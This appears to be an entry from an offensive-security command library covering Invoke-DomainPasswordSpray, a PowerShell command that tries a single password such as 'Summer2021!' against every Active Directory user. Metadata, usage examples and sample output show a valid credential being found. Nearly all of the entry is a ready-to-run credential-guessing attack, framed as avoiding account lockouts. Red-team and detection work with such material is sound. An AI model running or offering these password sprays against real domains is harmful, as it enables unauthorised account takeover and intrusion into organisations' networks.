---
id: a8808f2d-73b4-4c7a-b4d9-0849c2941910
name: invoke-domain-password-spray-single-password
type: command
executor: powershell
data: Invoke-DomainPasswordSpray -Password Summer2021!
output: null
created_at: '2023-04-06T03:56:04.297438+00:00'
updated_at: '2023-04-10T20:25:55.315382+00:00'
platforms:
  - Windows
tags:
  - password-spraying
  - active-directory
verified: true
validated: true
---

# invoke-domain-password-spray-single-password

## Command

```powershell
Invoke-DomainPasswordSpray -Password Summer2021!
```

## Description

This PowerShell command sprays a single password across all domain users using Kerberos pre-authentication, helping identify password reuse without lockouts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Password Summer2021! | The single password to spray | Yes |

## Examples

### Basic Usage

```powershell
Invoke-DomainPasswordSpray -Password Summer2021!
```

### Advanced Usage

```powershell
Invoke-DomainPasswordSpray -Password Winter2023! -Verbose
```

## Expected Output

[-] Spraying password: Summer2021!
[+] Valid credential found: jdoe@domain.com:Summer2021!

## Related

- [[procedures/Password-Spraying-with-Pre-Generated-Passwords]]
- [[tools/DomainPasswordSpray]]
